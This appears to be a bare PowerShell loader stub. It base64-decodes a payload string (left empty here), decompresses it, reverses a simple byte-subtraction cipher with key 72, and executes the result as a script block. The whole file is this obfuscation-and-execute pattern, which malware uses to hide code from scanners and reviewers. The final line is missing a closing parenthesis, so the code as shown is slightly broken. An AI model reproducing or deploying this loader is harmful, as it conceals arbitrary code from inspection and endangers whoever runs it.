$b=""
$k=72

$d=[Convert]::FromBase64String($b)
$ms=New-Object IO.MemoryStream(,$d)
$dz=New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress)
$r=New-Object IO.MemoryStream
$dz.CopyTo($r)

$buf=$r.ToArray()

for($i=0;$i -lt $buf.Length;$i++){
$buf[$i]=[byte](($buf[$i] - $k) -band 0xFF)
}

$cmd=[Text.Encoding]::UTF8.GetString($buf)
. ([ScriptBlock]::Create($cmd)
